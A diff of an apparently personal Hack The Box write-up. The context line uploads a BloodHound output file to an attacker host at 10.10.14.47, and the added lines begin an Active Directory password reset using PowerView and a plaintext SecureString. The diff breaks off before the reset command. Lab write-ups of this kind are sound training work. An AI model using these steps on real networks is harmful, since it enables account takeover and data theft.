@@ -182,8 +182,16 @@ Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240629101749_Bloo
 
 ![[Pasted image 20240629132729.png]]
 
+### PowerView.ps1
 
+```python
+>	Import-Module .\PowerView.ps1
 
+>	$NewPassword = ConvertTo-SecureString 'RespectMeOnHTB!' -AsPlainText -Force
+>	
+```
+
+![[Pasted image 20240629143532.png]]
 
 
 
